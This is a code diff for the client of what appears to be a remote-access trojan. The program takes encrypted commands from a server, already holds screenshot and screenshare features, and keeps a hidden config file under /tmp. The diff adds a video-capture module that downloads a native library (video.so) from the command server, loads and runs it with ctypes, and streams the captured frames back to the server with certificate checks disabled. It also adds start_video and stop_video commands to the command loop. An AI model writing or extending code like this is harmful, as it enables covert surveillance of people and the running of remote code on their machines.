@@ -11,7 +11,9 @@ from Crypto.Random import get_random_bytes
 import base64
 import sys
 from ctypes import *
+import ctypes
 import threading
+from urllib.request import urlretrieve
 
 os_name = platform.system()
 
@@ -29,11 +31,19 @@ screenshare_thread = None
 current_stop_event = None
 
 # Track the current working directory (starting with the root or default directory)
-current_directory = "/home/kali"#os.path.expanduser("~")
+current_directory = os.path.expanduser("~")
 SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later
 
+VIDEO_SO_URL = f"{SERVER_URL}/video.so"
+ENDPOINT = f"{SERVER_URL}/api/video-frame-from-client"
+
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
-CONFIG_FILE_WINDOWS = "/home/kali" #os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
+CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
+
+# Video-related globals
+video_thread = None
+video_stop_event = threading.Event()
+video_lib = None  # Will be loaded dynamically
 
 # Function to get the username using `whoami` (works on both Windows and Linux)
 def get_username():
@@ -732,6 +742,99 @@ def get_file_as_response_from_server_and_decrypt_and_save(filename,file_path, fi
     except Exception as e:
         print(e)
 
+def download_so(max_retries=3, delay=2):
+    so_path = "./video.so"
+    if os.path.exists(so_path) and os.path.getsize(so_path) > 0:
+        print(f"Using existing {so_path}")
+        return so_path
+
+    print(f"Attempting to download {so_path} from {VIDEO_SO_URL}...")
+    for attempt in range(max_retries):
+        try:
+            urlretrieve(VIDEO_SO_URL, so_path)
+            if os.path.exists(so_path) and os.path.getsize(so_path) > 0:
+                print(f"Successfully downloaded {so_path}")
+                os.chmod(so_path, 0o755)
+                file_info = subprocess.check_output(["file", so_path], text=True)
+                print(f"File info: {file_info}")
+                return so_path
+            else:
+                print(f"Downloaded file is empty or invalid")
+                os.remove(so_path) if os.path.exists(so_path) else None
+        except Exception as e:
+            print(f"Download attempt {attempt + 1}/{max_retries} failed: {e}")
+            if attempt < max_retries - 1:
+                time.sleep(delay)
+    print(f"Failed to download {so_path} after {max_retries} attempts")
+    return None
+
+def send_frame(data, length):
+    if video_stop_event.is_set():
+        return  # Stop sending if video is stopped
+    frame_data = ctypes.string_at(data, length)
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            response = requests.post(ENDPOINT, data=frame_data, headers={"Content-Type": "image/jpeg"}, timeout=5, verify=False)
+            response.raise_for_status()
+            print(f"Frame sent to server ({len(frame_data)} bytes)")
+            return
+        except requests.RequestException as e:
+            print(f"Error sending frame (attempt {attempt + 1}/{max_retries}): {e}")
+            if attempt < max_retries - 1:
+                time.sleep(1)
+    print("Failed to send frame after retries")
+
+def start_video_capture(duration, fps):
+    global video_stop_event, video_lib, video_thread
+    video_stop_event.clear()  # Reset stop flag
+
+    # Load video.so dynamically
+    so_path = download_so()
+    if not so_path:
+        print("Error: Could not obtain video.so. Checking for local copy...")
+        if os.path.exists("./video.so"):
+            so_path = "./video.so"
+            print("Using local video.so as fallback")
+        else:
+            print("No local video.so found. Cannot proceed with video capture.")
+            return False
+
+    if not os.path.exists(so_path):
+        print(f"Error: {so_path} does not exist after download")
+        return False
+    print(f"File size: {os.path.getsize(so_path)} bytes")
+
+    try:
+        video_lib = ctypes.CDLL(so_path)
+        print(f"Successfully loaded {so_path}")
+    except OSError as e:
+        print(f"Error loading {so_path}: {e}")
+        return False
+
+    FRAME_CALLBACK = ctypes.CFUNCTYPE(None, ctypes.POINTER(ctypes.c_ubyte), ctypes.c_size_t)
+    callback = FRAME_CALLBACK(send_frame)
+
+    video_lib.start_video_capture.restype = ctypes.c_int
+    video_lib.start_video_capture.argtypes = [ctypes.c_int, ctypes.c_int, FRAME_CALLBACK]
+
+    print(f"Starting video capture for {duration} seconds at {fps} FPS...")
+    try:
+        result = video_lib.start_video_capture(duration, fps, callback)
+        if result == 0:
+            print("Video capture completed successfully")
+            return True
+        else:
+            print(f"Video capture failed with code {result}")
+            return False
+    except Exception as e:
+        print(f"Error during video capture: {e}")
+        return False
+
+def stop_video():
+    global video_stop_event
+    video_stop_event.set()  # Signal to stop sending frames
+    print("Video capture stopped")
 
 while True:
     try:
@@ -756,6 +859,38 @@ while True:
             command_after_json_processing = process_json_command(decrypted_text_ready_to_convert_to_json)
             command = f"{command_after_json_processing}"
             print("The command is: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: ", command)
+
+            if command.startswith("start_video-"):
+                try:
+                    parts = command.split("-")
+                    if len(parts) != 3:
+                        raise ValueError("Format: start_video-<fps>-<duration>")
+                    fps = int(parts[1])
+                    duration = int(parts[2])
+                    if fps <= 0 or duration <= 0:
+                        raise ValueError("FPS and duration must be positive")
+                    
+                    # Stop any existing video thread
+                    if video_thread and video_thread.is_alive():
+                        stop_video()
+                        video_thread.join()
+                    
+                    # Start video in a new thread
+                    video_thread = threading.Thread(target=start_video_capture, args=(duration, fps))
+                    video_thread.start()
+                    command = ""
+                except ValueError as e:
+                    print(f"Invalid command format: {e}. Use start_video-<fps>-<duration> (e.g., start_video-10-20)")
+                    command = ""
+
+            elif command == "stop_video":
+                if video_thread and video_thread.is_alive():
+                    stop_video()
+                    video_thread.join()
+                    print("Video process fully stopped")
+                else:
+                    print("No video running to stop")
+                command = ""
             if command.strip() == "screenshot":
                 print("Starting screenshot process")
                 try:
